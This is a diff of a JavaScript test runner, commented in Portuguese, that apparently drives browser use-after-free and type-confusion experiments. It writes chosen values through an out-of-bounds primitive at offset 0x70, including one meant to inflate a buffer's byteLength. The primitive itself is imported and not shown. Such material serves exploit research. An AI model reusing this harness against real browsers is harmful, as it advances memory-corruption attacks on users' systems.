@@ -5,22 +5,22 @@ import { executeUAFTypeConfusionTestWithValue } from './testJsonTypeConfusionUAF
 // OOB_CONFIG é usado por testJsonTypeConfusionUAFSpeculative.mjs
 import { toHex } from '../utils.mjs';
 
-async function runUAFTC_VaryingOOBValue_WithExtendedRead() {
-    const FNAME_RUNNER = "runUAFTC_VaryingOOBValue";
-    logS3(`==== INICIANDO Testes UAF/TC Variando Valor OOB (com Checagem de Leitura Estendida) ====`, 'test', FNAME_RUNNER);
+async function runUAFTC_VaryingOOBValue_WithExtendedRead() { // Renomear para refletir a nova toJSON se quiser, ex: WithSpeculativeRead
+    const FNAME_RUNNER = "runUAFTC_VaryingOOBValue_WithSpecRead"; // Nome do runner atualizado
+    logS3(`==== INICIANDO Testes UAF/TC Variando Valor OOB (com Checagem de Leitura Especulativa) ====`, 'test', FNAME_RUNNER);
 
     const valuesToWrite = [
-        { desc: "Val_FFFFFFFF", val: 0xFFFFFFFF }, // O valor anterior
-        { desc: "Val_00000000", val: 0x00000000 }, // Zero
-        { desc: "Val_00000001", val: 0x00000001 }, // Pequeno valor
-        { desc: "Val_00010000", val: 0x00010000 }, // Potencialmente um tamanho maior (256KB se interpretado como dword)
-        { desc: "Val_7FFFFFFF", val: 0x7FFFFFFF }, // Maior dword positivo
-        { desc: "Val_41414141", val: 0x41414141 }, // 'AAAA'
-        // Adicione aqui outros valores que suspeita serem relevantes,
-        // como Structure IDs conhecidos ou outros ponteiros, se os tiver.
+        { desc: "Val_FFFFFFFF", val: 0xFFFFFFFF },
+        { desc: "Val_00000000", val: 0x00000000 },
+        { desc: "Val_00000001", val: 0x00000001 },
+        { desc: "Val_00010000", val: 0x00010000 },
+        { desc: "Val_7FFFFFFF", val: 0x7FFFFFFF },
+        { desc: "Val_41414141", val: 0x41414141 },
+        // Tentar um valor que, se escrito no byteLength, seria MUITO grande
+        { desc: "Val_GiganticSizeSim", val: 0x04000000 } // Ex: ~67MB se fosse o tamanho
     ];
 
-    const baseTestDescription = "UAFTC_ExtRead_Offset0x70";
+    const baseTestDescription = "UAFTC_SpecRead_Offset0x70"; // Descrição base atualizada
 
     for (const oobValue of valuesToWrite) {
         const testDescription = `${baseTestDescription}_${oobValue.desc}`;
@@ -43,22 +43,22 @@ async function runUAFTC_VaryingOOBValue_WithExtendedRead() {
         logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");
     }
 
-    logS3(`==== Testes UAF/TC Variando Valor OOB CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Testes UAF/TC Variando Valor OOB (com Leitura Especulativa) CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_VaryOOB_ExtRead';
+    const FNAME = 'runAllAdvancedTestsS3_VaryOOB_SpecRead'; // Nome do teste principal atualizado
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Testes UAF/TC Variando Valor OOB com Checagem de Leitura Estendida ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - VaryOOB + ExtRead";
+    logS3(`==== INICIANDO Script 3: Testes UAF/TC Variando Valor OOB com Checagem de Leitura Especulativa ====`,'test', FNAME);
+    document.title = "Iniciando Script 3 - VaryOOB + SpecRead";
 
     await runUAFTC_VaryingOOBValue_WithExtendedRead();
 
-    logS3(`\n==== Script 3 CONCLUÍDO (Testes UAF/TC Variando Valor OOB com Checagem de Leitura Estendida) ====`,'test', FNAME);
+    logS3(`\n==== Script 3 CONCLUÍDO (Testes UAF/TC Variando Valor OOB com Checagem de Leitura Especulativa) ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
 }
